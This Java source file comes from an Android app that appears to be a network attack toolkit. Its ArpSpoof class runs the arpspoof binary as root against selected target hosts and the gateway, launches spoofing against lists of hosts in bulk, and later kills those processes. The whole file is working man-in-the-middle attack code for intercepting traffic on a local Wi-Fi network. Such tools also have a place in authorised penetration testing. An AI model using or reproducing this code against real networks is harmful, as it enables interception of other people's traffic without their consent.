package fr.dao.app.Core.Network;

import android.util.Log;

import java.io.BufferedReader;
import java.io.IOException;
import java.util.ArrayList;
import java.util.List;

import fr.dao.app.Core.Configuration.RootProcess;
import fr.dao.app.Core.Configuration.Singleton;
import fr.dao.app.Model.Target.Host;

public class                        ArpSpoof {
    private static final String     TAG = "ArpSpoof";
    private ArpSpoof                mInstance = this;
    private Host                    mTarget;
    private RootProcess             mProcess;
    public static List<ArpSpoof>    ArpSpoofProcessStack = new ArrayList<>();

    private                         ArpSpoof(Host target) {
        this.mTarget = target;
    }

    public ArpSpoof                 start() {
        if (Singleton.getInstance().Settings.DebugMode)
            Log.d(TAG, "ARPSpooging Attacking " + mTarget.ip);
        new Thread(new Runnable() {
            public void run() {
                mProcess = new RootProcess("ARPSPoof::" + mTarget.ip);
                mProcess.exec(Singleton.getInstance().Settings.BinaryPath + "arpspoof -i wlan0 -t " +
                        mTarget.ip + " " + Singleton.getInstance().NetworkInformation.gateway);
                ArpSpoof.ArpSpoofProcessStack.add(mInstance);
                if (Singleton.getInstance().Settings.DebugMode) {
                    BufferedReader reader = mProcess.getReader();
                    String read;
                    try {
                        while ((read = reader.readLine()) != null) {
                            Log.d(TAG, mTarget.ip + "::" + read);
                        }
                    } catch (IOException e) {
                        e.printStackTrace();
                    }
                }
            }
        }).start();
        return this;
    }

    public static void              stopArpSpoof() {
        if (Singleton.getInstance().Settings.DebugMode)
            Log.d(TAG, "STOP ARPSpooging Attacking ");
        new Thread(new Runnable() {
            public void run() {
                RootProcess process = new RootProcess("stopArpSpoof ARPSpoof");
                process.exec("ps | grep arpspoof");
                BufferedReader reader = new BufferedReader(process.getReader());
                String line;
                try {
                    while ((line = reader.readLine()) != null) {
                        if (line.contains("arp") && Singleton.getInstance().Settings.UltraDebugMode)
                            Log.d(TAG, line);
                        String pidArpProcess = line.replace("  ", " ").split(" ")[3];
                        new RootProcess("ARPSpoof").exec("kill SIGINT " + pidArpProcess).closeProcess();
                    }
                } catch (IOException e) {
                    e.printStackTrace();
                }
                process.closeProcess();
                ArpSpoof.ArpSpoofProcessStack.clear();
            }
        }).start();
    }

    public static void              launchArpSpoof(List<Host> hosts) {
        Log.d(TAG, "Arp spoofing " + hosts.size() + " targets");
        for (Host host : hosts) {
            new ArpSpoof(host).start();
        }
    }
}